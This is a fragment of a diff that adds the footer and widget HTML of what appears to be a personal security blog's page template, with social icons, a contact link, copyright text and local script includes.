+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/2dda03e0ac5747f2161091ad279bc97f.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
